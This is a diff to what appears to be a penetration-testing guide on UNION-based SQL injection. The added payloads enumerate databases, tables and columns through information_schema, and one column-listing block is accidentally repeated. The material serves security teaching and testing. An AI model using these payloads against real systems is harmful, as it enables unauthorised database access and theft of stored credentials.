@@ -96,6 +96,7 @@ In this example, the `username` and `password` columns are retrieved from the `u
 
 > In case the extraction field is numeric, it may be useful to indicate negative numbers. This way, a SELECT is not performed on that numeric value and the desired value is selected instead, for example:
 `id = -1 UNION SELECT NULL, database(), NULL --`
+
 #### Additional Information Extraction
 
 - **Obtain the current database name:**
@@ -110,14 +111,29 @@ In this example, the `username` and `password` columns are retrieved from the `u
 ' UNION SELECT NULL, version(), NULL -- 
 ```
 
-- **List available tables in information_schema.tables:**
+- **Enumerating Other Databases:**
+
 ```sql
-' UNION SELECT NULL, table_name, NULL FROM information_schema.tables -- 
+' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata -- 
+```
+
+- **Enumerating tables from a specific DB:**
+```sql
+' UNION SELECT NULL, table_name, NULL 
+FROM information_schema.tables 
+WHERE table_schema='target_db' -- 
 ```
 
 - **List column names from a specific table:**
 
 ```sql
-' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' -- 
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' AND table_schema='target_db' -- 
 ```
+
+- **List column names from a specific table:**
+
+```sql
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' AND table_schema='target_db' -- 
+```
+
 
